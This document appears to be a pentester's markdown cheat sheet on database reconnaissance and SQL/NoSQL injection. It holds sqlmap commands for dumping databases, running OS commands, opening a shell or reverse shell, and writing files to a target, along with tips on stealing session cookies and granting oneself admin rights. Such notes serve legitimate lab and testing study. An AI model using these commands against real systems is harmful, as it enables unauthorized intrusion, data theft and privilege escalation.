# Basic reconaissance
## Tips
- If a database has a table of session one can try to steal cookies or other credentials from the table to authenticate as another user.     
- If one is in a database with write access and there are roles assigned to users, give the current user admin rights.

## SQL injection cheat sheets
- [https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html)
- [https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)
- [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


## Universal structures
```
information_schema              Metadata and all the databases and tables
information_schema.schemata     Databases
information_schema.tables       Tables
information_schema.columns      Columns
```

## Tools (SQL)
## sqlmap
### GET
Discover vulnerabilities in databases as well as dump info
```sh
sqlmap -u <URL> --batch
```

### POST
```sh
# With request file
# Add request into a log file (either from Burp or Chrome)
sqlmap -r <request_file> --batch

sqlmap -u <URL> --data "username=*&password=*"
```

### Web sockets
```sh
sqlmap -u ws://<ip><port> --data <data>
```

### Commands
**To get data from any query use the `--dump` option**
```sh
# Get all databases
sqlmap -u <URL> --dbs

# Set DBMS
sqlmap -u <URL> --dbms="dbms"

# Database
sqlmap -u <URL> -D <database>

# Tables
sqlmap -u <URL> --tables -D <database>

## Specify table
sqlmap -u <URL> -D <database> -T <table>

# Columns
sqlmap -u <URL> --columns -D <database> -T <table>
```

### Shell
To get upload web interface look for `file stager` otherwise look for `backdoor` in the output.
```sh
# Exec command
sqlmap -u <URL>  --os-cmd <command>

# Simple Shell
sqlmap -u <URL> --os-shell

# Dropping a reverse-shell / meterpreter
sqlmap -u <URL> --os-pwn
```

#### File upload
```sh
sqlmap -u <url> --data <data> --file-write <local_file> --file-dest <destination>
```

### References
- [https://0xdf.gitlab.io/2018/06/23/htb-falafel.html](https://0xdf.gitlab.io/2018/06/23/htb-falafel.html)
- [https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#shell](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#shell)
- [https://www.binarytides.com/sqlmap-hacking-tutorial/](https://www.binarytides.com/sqlmap-hacking-tutorial/)
- [https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/)



## Tools (NoSQL)
### List of tools and exploits
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

​
### NoSQLMap
Since the tool is using a menu based system, I'll link the GitHub page for one to read the steps.     
[Documentation and Release](https://github.com/codingo/NoSQLMap)
​​